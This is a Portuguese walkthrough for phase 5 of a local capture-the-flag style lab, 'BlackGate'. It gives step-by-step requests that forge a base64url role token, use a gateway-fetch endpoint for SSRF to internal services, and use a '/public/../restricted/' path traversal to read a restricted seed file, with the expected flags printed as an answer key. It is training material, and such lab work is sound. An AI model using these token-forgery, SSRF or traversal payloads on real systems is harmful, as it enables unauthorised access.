# Lab 05 - BlackGate - Walkthrough da Fase 5

Este walkthrough cobre a **Fase 5 — Files Vault / Controlled File Read** do Lab 05. A aplicação mantém as fases anteriores e adiciona uma leitura controlada em um serviço interno simulado. Não há leitura real do filesystem, command injection, upload, Redis, worker ou admin final.

## Como subir

```bash
cd lab-05-blackgate
docker compose up --build
```

Acesse:

```text
http://localhost:8096
```

## Validação de saúde

Abra:

```text
http://localhost:8096/health
```

Resultado esperado:

```json
{
  "service": "blackgate",
  "status": "ok",
  "version": "1.4.0-phase5"
}
```

## Login

Abra `http://localhost:8096` e faça login com:

```text
guest / guest123
```

Resultado esperado:

- login bem-sucedido;
- redirecionamento para `/dashboard`;
- topo com usuário, role e link de logout;
- menu com `/context`, `/gateway` e `/files-vault`.

## Recon inicial

Confirme os endpoints públicos:

```text
/robots.txt
/.well-known/security.txt
/api/status
/api/version
/api/client-config
/api/routes
/debug/ping
```

Com o header abaixo, `/debug/ping` revela metadados limitados de contexto, gateway e Files Vault:

```text
X-Debug-Token: guest-debug
```

Observe que `/api/client-config` e `/api/routes` mostram pistas de:

- `X-BG-Context`;
- gateway operator-mediated;
- files-vault em modo gateway-only;
- rotas de gateway-fetch;
- rotas planejadas de legacy/auth e credenciais.

## Gerar contexto operator

Abra `/context`, consulte `/api/context/me`, decodifique o token base64url e gere um contexto operator:

```bash
TOKEN=$(node -e 'const p={user:"guest",role:"operator",scope:"operations",issued_by:"legacy-context-service"}; console.log(Buffer.from(JSON.stringify(p)).toString("base64url"))')
echo "$TOKEN"
```

Valide:

```text
POST /api/context/verify
Header: X-BG-Context: <TOKEN>
```

## Fase 3 ainda funcional

Use:

```text
GET /api/operator/briefing
Header: X-BG-Context: <TOKEN>
```

Resultado esperado:

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
```

## Fase 4 ainda funcional

Consulte o gateway metadata:

```text
GET /api/operator/gateway-metadata
Header: X-BG-Context: <TOKEN>
```

Depois consulte o `api-core` pelo gateway:

```text
/api/operator/gateway-fetch?url=http://api-core.internal/metadata
```

Resultado esperado:

```text
FLAG{blackgate_gateway_trust_ssrf_phase4}
```

## Files Vault metadata

Agora consulte:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/metadata
```

Observe:

- `catalog`;
- `read_endpoint`;
- `download_endpoint`;
- `safe_paths`;
- `restricted_paths`;
- `path_policy`;
- `next_hint`.

Esse metadata não contém a flag da Fase 5. Ele mostra que o serviço migrou de downloads por nome para leitura por path completo.

## Catalog

Consulte:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/catalog
```

Resultado esperado:

- documentos públicos;
- IDs como `access-policy`, `migration-note` e `gateway-checklist`;
- `restricted_index.enabled` como `false`.

O catálogo não lista diretamente o seed restrito.

## Download nomeado

Teste o endpoint de download por nome:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/download?file=migration-note.txt
```

Resultado esperado:

```text
Migration note: files-vault is moving from named downloads to path-based reads. Legacy path compatibility remains enabled during transition.
```

Esse conteúdo indica que existe compatibilidade legada com leitura por path completo.

## Read de arquivo público

Leia primeiro um arquivo público documentado:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/notices/migration-note.txt
```

Resultado esperado:

- HTTP 200;
- `service: files-vault`;
- `path: /public/notices/migration-note.txt`;
- conteúdo da nota de migração.

## Falha de validação de path

A falha da Fase 5 está no fluxo de leitura simulado:

1. O Files Vault verifica se o path bruto começa com `/public/`.
2. Depois aplica normalização POSIX.
3. Em seguida lê o documento normalizado a partir de um mapa em memória.

Isso permite que um caminho bruto aparentemente público normalize para uma área restrita:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt
```

Resultado esperado:

```text
FLAG{blackgate_files_vault_controlled_read_phase5}
```

Essa é uma leitura controlada e didática. O lab não chama `fs.readFile` com input do usuário e não acessa arquivos reais do host ou do container.

## Bloqueios esperados

Path restrito direto:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/restricted/phase5-seed.txt
```

Resultado esperado:

```json
{
  "error": "forbidden_path",
  "message": "Only public document paths are allowed by the legacy pre-check."
}
```

Arquivo reservado para a próxima fase:

```text
/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt
```

Resultado esperado:

```json
{
  "error": "redacted",
  "message": "Credential archive is sealed until migration approval."
}
```

Sem parâmetro `path`:

```json
{
  "error": "bad_request",
  "message": "path parameter is required."
}
```

Arquivo inexistente:

```json
{
  "error": "file_not_found",
  "message": "Document not found."
}
```

## Flags confirmadas até esta fase

```text
FLAG{blackgate_weak_token_role_escalation_phase3}
FLAG{blackgate_gateway_trust_ssrf_phase4}
FLAG{blackgate_files_vault_controlled_read_phase5}
```

## O que fica para a próxima fase

A Fase 5 não libera credenciais reais de painel legado. O arquivo de credenciais reservado retorna `redacted`; credential reuse e legacy panel ficam para a Fase 6.
